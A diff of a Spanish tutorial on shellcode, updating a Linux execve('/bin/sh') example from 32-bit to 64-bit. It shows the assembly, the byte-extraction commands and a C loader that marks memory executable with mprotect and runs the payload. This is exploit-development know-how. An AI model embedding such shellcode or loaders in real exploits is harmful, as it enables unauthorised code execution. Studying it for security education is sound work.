@@ -24,22 +24,22 @@ Un shellcode efectivo debe cumplir con los siguientes criterios:
 - **Portable**: Funciona en múltiples versiones del sistema operativo objetivo.
 
 ### 4. Creación de un Shellcode
-Para crear un shellcode, se usa ensamblador y luego se convierte en una cadena de bytes. Por ejemplo, un shellcode en **x86 Linux** para ejecutar `/bin/sh`:
+Para crear un shellcode, se usa ensamblador y luego se convierte en una cadena de bytes. Por ejemplo, un shellcode en **Linux** adaptado para **64 bits** que ejecuta `/bin/sh`:
 
 ```assembly
 section .text
     global _start
 
 _start:
-    xor eax, eax         ; Limpia eax
-    push eax             ; NULL terminator
-    push 0x68732f2f      ; "//sh"
-    push 0x6e69622f      ; "/bin"
-    mov ebx, esp         ; Apunta ebx a "/bin//sh"
-    xor ecx, ecx         ; argv = NULL
-    xor edx, edx         ; envp = NULL
-    mov al, 0xb          ; syscall execve
-    int 0x80             ; Llamada al kernel
+    xor rax, rax         ; Limpia rax
+    push rax             ; NULL terminator
+    mov rdi, 0x68732f6e69622f2f ; "//bin/sh" en hexadecimal
+    push rdi
+    mov rdi, rsp         ; Apunta rdi a "/bin//sh"
+    xor rsi, rsi         ; argv = NULL
+    xor rdx, rdx         ; envp = NULL
+    mov rax, 59          ; syscall execve (59 en 64 bits)
+    syscall              ; Llamada al kernel
 ```
 ### 5. Conversión de Shellcode a Cadena de Bytes
 
@@ -48,13 +48,13 @@ Para convertir un shellcode en ensamblador a una cadena de bytes.
 Primero ensamblamos el código:
 
 ```bash
-nasm -f elf32 shellcode.asm -o shellcode.o
+nasm -f elf64 -o shellcode.o shellcode.asm
 ```
 
 Luego, lo vinculamos y obtenemos el shellcode en formato hexadecimal con `objdump`:
 
 ```bash
-ld -m elf_i386 -o shellcode shellcode.o
+ld -o shellcode shellcode.o
 objdump -d shellcode | grep '[0-9a-f]:' | grep -o '\b[0-9a-f]\{2\}\b' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
 ```
 
@@ -67,21 +67,37 @@ Podemos probar el shellcode en un programa en C:
 ```c
 #include <stdio.h>
 #include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
 
-unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
+unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";
 
 int main() {
     printf("Ejecutando shellcode...\n");
-    int (*ret)() = (int(*)())shellcode;
+
+    // Obtener el tamaño de la página de memoria
+    size_t pagesize = sysconf(_SC_PAGESIZE);
+    void *shellcode_page = (void *)((size_t)shellcode & ~(pagesize - 1));
+
+    // Cambiar permisos de memoria a ejecutable
+    if (mprotect(shellcode_page, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
+        perror("mprotect");
+        return 1;
+    }
+
+    // Ejecutar shellcode
+    void (*ret)() = (void(*)())shellcode;
     ret();
+
+    return 0;
 }
 ```
 
 Compilamos y ejecutamos:
 
 ```bash
-gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcodec
-./shellcodec
+gcc -o shellcode_exec shellcode.c -z execstack -no-pie
+./shellcode_exec
 ```
 
 Si se ejecuta correctamente, abrirá una shell interactiva.
